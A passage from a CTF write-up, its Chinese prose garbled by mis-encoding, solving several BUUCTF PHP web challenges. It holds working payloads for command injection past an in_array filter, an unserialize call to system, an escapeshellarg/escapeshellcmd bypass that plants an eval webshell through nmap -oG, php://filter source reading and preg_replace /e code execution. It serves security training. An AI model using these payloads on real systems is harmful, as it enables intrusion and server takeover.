    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```



>  \ ç»•è¿‡in_array()
>
> func=\system&p=cat $(find / -name flag*)
>
> æˆ–è€…
>
> func=\exec&p=cat $(find / -name flag*)

> ååºåˆ—åŒ–
>
> func=unserialize&p=O:4:"Test":2:{s:1:"p";s:18:"find / -name flag*";s:4:"func";s:6:"system";}
>
> ç„¶åè¿›è¡Œcat å‘½ä»¤æŠ“å–flag
>
> func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}
>
>  æˆ–è€…readfileè¯»å–flagæ–‡ä»¶
>
> func=readfile&p=/tmp/flagoefiu4r93
>
> 
>
> æˆ–è€…ç±»ä¼¼expçš„payload
>
> func=unserialize&p=O:4:"Test":2:{s:1:"p";s:25:"cat $(find / -name flag*)";s:4:"func";s:6:"system";}

## 

## [BUUCTF 2018]Online Tool

æºç ï¼š

```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```



æœ¬åœ°æµ‹è¯•ï¼š

```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    echo $host."<br>";
    $host = escapeshellcmd($host);
    echo $host."<br>";
    highlight_file(__FILE__);
```



> Escapeshellarg()å‡½æ•°æŠŠå­—ç¬¦ä¸²è½¬ç æˆå¯ä»¥åœ¨shellå‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°ï¼Œå°†å•å¼•å·è¿›è¡Œè½¬ä¹‰ï¼Œè½¬ä¹‰ä¹‹åï¼Œå†åœ¨å·¦å³åŠ å•å¼•å·ã€‚
>  Escapeshellcmd()å‡½æ•°å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰,å³å°†&#;`|*?~<>^()[]{}$\, \x0Aå’Œ\xFFä»¥åŠä¸é…å¯¹çš„å•/åŒå¼•å·è½¬ä¹‰ã€‚

![img](https://img-blog.csdnimg.cn/0678913df3ee412ab99b3a7393df9027.png)



 payload:

```php
host=' <?php @eval($_POST["hack"]);?> -oG hack.php '
```



```php
http://9fc4eff7-b643-407c-8d36-9264a2031c04.node4.buuoj.cn:81/?host=%27%20%3C?php%20@eval($_POST[%22hack%22]);?%3E%20-oG%20hack.php%20%27
```



```php
http://9fc4eff7-b643-407c-8d36-9264a2031c04.node4.buuoj.cn:81/a443996fcc9701a67983355732d1cf07/hack.php
```



 [PHP: escapeshellcmd - Manual](https://www.php.net/manual/zh/function.escapeshellcmd.php)

1.escapeshellarg()å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚å¯¹äºç”¨æˆ·è¾“å…¥çš„éƒ¨åˆ†å‚æ•°å°±åº”è¯¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ã€‚shell å‡½æ•°åŒ…å«exec(),system()æ‰§è¡Œè¿ç®—ç¬¦ã€‚

2.escapeshellcmd()å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ°exec()æˆ–system()å‡½æ•°ï¼Œæˆ–è€…æ‰§è¡Œæ“ä½œç¬¦ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚åæ–œçº¿ï¼ˆ\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š&#;`|*?~<>^()[]{}$,\x0Aå’Œ\xFFã€‚'å’Œ"ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ%å’Œ!å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚

ä¾‹å­ï¼šæ¥è‡ªseebug
 1.ä¼ å…¥çš„å‚æ•°æ˜¯ï¼š172.17.0.2â€™ -v -d a=1

2.ç»è¿‡escapeshellargå¤„ç†åå˜æˆäº†â€™172.17.0.2â€™â€™â€™ -v -d a=1â€™ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚

```php
 '172.17.0.2'     \'      ' -v -d a=1'
 ä¸‰éƒ¨åˆ†ï¼Œä¸­é—´çš„å°±æ˜¯æˆ‘ä»¬åŸæ¥åŠ çš„é‚£ä¸ª'ï¼ˆä½œç”¨æˆ‘ä»¬åœ¨ä¸‹é¢ä¼šä½“ç°å‡ºæ¥ï¼‰ï¼Œ
 ç„¶åç”¨å•å¼•å·æ‹¬èµ·æ¥ã€‚
```

![ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

3.ç»è¿‡escapeshellcmdå¤„ç†åå˜æˆâ€™172.17.0.2â€™\â€™â€™ -v -d a=1â€™ï¼Œè¿™æ˜¯å› ä¸ºescapeshellcmdå¯¹\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰

```php
'172.17.0.2'     \\     ''      -v -d a=1\'
å››éƒ¨åˆ†ï¼Œç¬¬äºŒéƒ¨åˆ†çš„\ï¼ˆä¹Ÿå°±æ˜¯ä¸Šé¢æˆ‘ä»¬æ‰€åŠ çš„å•å¼•å·è¢«escapeshellargè½¬ä¹‰æ‰€å¤šå‡ºæ¥ï¼‰
è¢«è½¬ä¹‰å˜ä¸º\\,é‚£ä¹ˆåœ¨æœ€åæ‰§è¡Œçš„æ—¶å€™ä¼šè§£é‡Šä¸º\,ç„¶åä¸Šé¢æˆ‘ä»¬åŠ çš„é‚£ä¸ª'ä¼šå’Œåé¢ä¸€ä¸ª'ç»„åˆä¸º
ä¸€ä¸ªç©ºå­—ç¬¦ä¹Ÿå°±æ˜¯''
```



4.æœ€åæ‰§è¡Œçš„å‘½ä»¤æ˜¯curl â€˜172.17.0.2â€™\â€™â€™ -v -d a=1â€™ï¼Œç”±äºä¸­é—´çš„\è¢«è§£é‡Šä¸º\è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„â€™æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„â€™é…å¯¹å„¿æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸ºcurl 172.17.0.2\ -v -d a=1â€™ï¼Œå³å‘172.17.0.2\å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸ºa=1â€™ã€‚

```php
æ€»ç»“æ¥è¯´æˆ‘ä»¬è¦åœ¨webshellå‰åŠ 'æ˜¯ä¸ºäº†æä¾›ä¸€ä¸ª\,åŠŸèƒ½æ˜¯å‘\å‰çš„ipå‘èµ·è¯·æ±‚ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½
å¯¹æ­¤ipè¿›è¡Œshellã€‚

åœ¨æœ¬é¢˜ä¸­åŸç çš„æ„æ€æ˜¯æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªipç„¶åæ‰«æï¼Œé€šè¿‡ä¸Šé¢çš„ä¸¤ä¸ªå‡½æ•°æ¥è¿›è¡Œè§„åˆ™è¿‡æ»¤è½¬ä¹‰ï¼Œ
æˆ‘ä»¬çš„è¾“å…¥ä¼šè¢«å•å¼•å·å¼•èµ·æ¥ï¼Œä½†å› ä¸Šé¢çš„æ¼æ´æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨'é€ƒè„±è¿™ä¸ªå¼•å·çš„æŸç¼š
```



```php
å¹¶ä¸”åœ¨nmapå‘½ä»¤ä¸­ æœ‰ä¸€ä¸ªå‚æ•°-oGå¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™åˆ°æ–‡ä»¶ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ–‡ä»¶åŒ…å«æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæˆ–èšå‰‘è¿æ¥ã€‚
```





## [BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤

```php
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```



```php
http://469abb72-79e7-4c12-a595-02f51e1ddfa3.node4.buuoj.cn:81/?text=data://text/plain,I%20have%20a%20dream&file=next.php
```



![img](https://img-blog.csdnimg.cn/98615e25dc3c4948b02aed0b6da06fed.png)





```php
http://469abb72-79e7-4c12-a595-02f51e1ddfa3.node4.buuoj.cn:81/?text=data://text/plain,I%20have%20a%20dream&file=php://filter/convert.base64-encode/resource=next.php
```



![img](https://img-blog.csdnimg.cn/267d9e7e618142d2ad75991fe73b9c74.png)



```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}
```





```php
http://051b1af0-9322-4e25-9615-ea8c873f2568.node4.buuoj.cn:81/?text=data://text/plain,I%20have%20a%20dream&file=next.php&\S*=${getflag()}&cmd=system(%27cat%20/flag%27);
```

